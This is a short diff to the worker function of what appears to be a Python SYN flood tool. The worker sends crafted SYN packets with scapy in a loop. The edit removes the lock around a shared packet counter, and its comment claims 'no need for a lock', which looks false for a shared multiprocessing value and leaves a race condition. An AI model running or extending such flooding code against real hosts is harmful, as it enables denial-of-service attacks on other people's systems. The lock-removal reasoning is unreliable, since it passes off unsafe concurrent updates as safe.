@@ -27,9 +27,8 @@ def syn_flood_worker(target_ip, target_port, running_flag, packet_counter, iface
             # Send the SYN packet over the specified interface
             send(packet, verbose=0, iface=iface)
 
-            # Track the number of packets sent
-            with packet_counter.get_lock():  # Lock for safe access to shared counter
-                packet_counter.value += 1  # Increment the packet counter
+            # Track the number of packets sent (no need for a lock in this case)
+            packet_counter.value += 1  # Increment the packet counter
         except Exception as e:
             print(f"Error sending packet: {e}")
             continue
